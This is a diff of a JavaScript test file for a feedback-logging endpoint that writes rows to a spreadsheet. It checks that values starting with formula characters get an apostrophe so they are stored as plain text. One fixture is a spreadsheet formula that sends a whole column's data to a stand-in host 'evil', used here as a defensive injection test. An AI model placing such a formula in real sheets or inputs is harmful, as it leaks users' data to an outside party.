@@ -109,7 +109,7 @@ test('a wrong, missing or empty secret is denied; either environment\'s secret i
   assert.deepEqual(load({ props: { RJ_SHEET_ID: 'sheet-id' } }).post({ secret: '', op: 'append', rows: [] }), { ok: false, error: 'denied' }, 'no secret set: nobody gets in');
 });
 
-test('append writes every string as plain text: "@" format and a leading apostrophe; dates and Build typed', () => {
+test('append writes every string as plain text: "@" format, and an apostrophe before a formula character; dates and Build typed', () => {
   const { post, tab } = load();
   const evil = '=IMAGE("https://evil/?"&JOIN(",",A:A))';
   const r = row({ Feedback: evil, Player: '+cmd (#3)', Where: '@x', Device: '-1', Context: '{"a":"=1+1"}' });
@@ -118,8 +118,11 @@ test('append writes every string as plain text: "@" format and a leading apostro
   const cell = (name) => tab.cells[2][col(name)];
   for (const name of ['Env', 'Tags', 'Feedback', 'Player', 'Where', 'Platform', 'Device', 'Feedback ID', 'Context']) {
     assert.equal(cell(name).format, '@', name);
-    assert.equal(cell(name).raw, `'${r[name]}`, name);
+    const risky = /^[=+\-@]/.test(r[name]);
+    assert.equal(cell(name).raw, risky ? `'${r[name]}` : r[name], name);
   }
+  assert.equal(cell('Feedback').raw, `'${evil}`, 'a formula character gets the apostrophe');
+  assert.equal(cell('Env').raw, r.Env, 'ordinary text gets none (a "@" cell would show it)');
   assert.equal(cell('Feedback').value, evil, 'stored as the text itself');
   assert.ok(cell('Received').raw instanceof Date || Object.prototype.toString.call(cell('Received').raw) === '[object Date]');
   assert.equal(cell('Received').raw.toISOString(), '2026-10-14T18:00:00.000Z');
@@ -132,7 +135,7 @@ test('append writes every string as plain text: "@" format and a leading apostro
 test('a Written that does not parse stays text; a Build that is not a number is text', () => {
   const { post, tab } = load();
   post({ secret: DEV, op: 'append', rows: [row({ Written: 'yesterday', Build: '' }), row({ Written: '=NOW()' })] });
-  assert.deepEqual([tab.cells[2][col('Written')].raw, tab.cells[2][col('Written')].format], ["'yesterday", '@']);
+  assert.deepEqual([tab.cells[2][col('Written')].raw, tab.cells[2][col('Written')].format], ['yesterday', '@']);
   assert.deepEqual([tab.cells[2][col('Build')].raw, tab.cells[2][col('Build')].format], ['', '@']);
   assert.equal(tab.cells[3][col('Written')].raw, "'=NOW()");
 });
